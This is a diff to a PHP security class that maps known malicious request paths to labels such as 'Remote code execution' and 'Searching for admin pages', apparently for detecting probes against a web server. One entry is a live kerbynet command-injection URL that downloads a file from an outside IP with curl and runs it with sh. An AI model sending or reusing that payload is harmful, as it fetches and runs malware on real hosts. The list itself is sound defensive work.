@@ -114,7 +114,10 @@ class security
                 "/status?full&json" => "Searching for server status pages",
                 "/server-status?format=plain" => "Searching for server status pages",
                 "/admin/api.php?version" => "Searching for admin pages",
-                "/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22" => "Remote code execution"
+                "/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22" => "Remote code execution",
+                "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media" => "Attempt to upload assets",
+                "/admin/view/javascript/common.js" => "Searching for admin pages",
+                "/boaform/admin/formPing" => "Wifi Router exploit (likley botnet)"
         );
 
             return $exploits;
